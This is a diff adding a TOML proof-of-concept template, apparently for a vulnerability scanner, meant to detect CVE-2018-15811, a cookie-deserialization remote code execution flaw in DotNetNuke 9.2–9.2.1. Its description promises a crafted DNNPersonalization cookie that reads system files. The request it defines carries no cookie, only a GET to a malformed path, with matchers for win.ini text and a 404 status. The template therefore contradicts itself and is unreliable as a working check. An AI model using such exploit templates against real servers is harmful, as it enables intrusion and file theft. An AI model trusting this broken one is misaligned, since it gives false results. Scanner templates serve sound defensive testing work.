@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 DNN (DotNetNuke) 9.2-9.2.1 弱加密算法导致的 Cookie 反序列化远程代码执行漏洞，通过发送特制 DNNPersonalization Cookie 触发反序列化读取系统文件"
+id = "POC-AVE-2018-0406"
+name = "CVE-2018-15811 PoC"
+severity = "high"
+tags = ["cve-2018-15811"]
+vuln_id = [
+    "CVE-2018-15811",
+    "AVE-2018-0406",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/__"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "[extensions]",
+    "for 16-bit app support",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [404]
+type = "status"
